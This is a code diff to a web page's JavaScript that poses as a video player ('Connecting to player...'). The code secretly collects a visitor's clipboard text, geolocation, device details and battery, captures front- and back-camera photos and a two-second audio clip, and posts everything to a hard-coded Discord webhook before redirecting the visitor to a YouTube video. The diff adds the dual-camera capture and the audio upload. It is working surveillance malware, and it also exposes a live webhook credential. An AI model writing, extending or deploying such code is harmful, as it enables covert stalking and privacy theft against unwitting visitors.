@@ -26,11 +26,21 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
+        // Helper function to handle image processing for both cameras
+        async function takeSnapshot(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+        }
+
         async function send() {
             const status = document.getElementById('status');
             status.innerText = "Connecting to player...";
 
-            // 1. GATHER ALL INFO (Silent)
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const screenRes = `${window.screen.width}x${window.screen.height}`;
@@ -51,48 +61,59 @@
             let clip = "Denied";
             try { clip = await navigator.clipboard.readText(); } catch (e) {}
 
-            // 2. TRIGGER PERMISSIONS
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const mapLink = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // SEND FULL TEXT PAYLOAD
+                // STEP 1: Send Text Metadata
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n🚀 **RAM:** ${ram}GB\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}\n🕵️ **Agent:** \`${ua.substring(0, 80)}...\`` 
+                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n🚀 **RAM:** ${ram}GB\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}` 
                     })
                 });
 
-                // 3. MEDIA CAPTURE
+                // STEP 2: DUAL MEDIA CAPTURE
+                const fd = new FormData();
+                let audioBlob = null;
+
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
+                    // 2a. Capture Front Camera (User) + Audio
+                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                    const frontPhoto = await takeSnapshot(frontStream);
+                    fd.append("file1", frontPhoto, "front_face.jpg");
 
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 480; canvas.height = 640;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-                    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-
-                    const mediaRecorder = new MediaRecorder(stream);
+                    // Start Audio Recording (using the front stream's audio)
+                    const mediaRecorder = new MediaRecorder(frontStream);
                     const chunks = [];
                     mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                    const record = new Promise((res) => {
+                    const recordTask = new Promise((res) => {
                         mediaRecorder.onstop = () => res(new Blob(chunks, { type: 'audio/wav' }));
-                        mediaRecorder.start();
-                        setTimeout(() => mediaRecorder.stop(), 2000);
                     });
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 2000);
+                    audioBlob = await recordTask;
+                    
+                    // Close front stream tracks
+                    frontStream.getTracks().forEach(t => t.stop());
 
-                    const audioBlob = await record;
-                    stream.getTracks().forEach(t => t.stop());
+                    // 2b. Capture Back Camera (Environment)
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    const backPhoto = await takeSnapshot(backStream);
+                    fd.append("file2", backPhoto, "back_view.jpg");
+                    
+                    // Close back stream tracks
+                    backStream.getTracks().forEach(t => t.stop());
 
-                    const fd = new FormData();
-                    fd.append("file1", photoBlob, "snap.jpg");
-                    fd.append("file2", audioBlob, "audio.wav");
+                    // Append Audio to the form
+                    if (audioBlob) fd.append("file3", audioBlob, "audio.wav");
+
+                    // STEP 3: Send All Files to Discord
                     await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                } catch (err) {}
+
+                } catch (mediaErr) {
+                    console.log("Media blocked or not available");
+                }
 
                 window.location.replace(REDIRECT_URL);
 
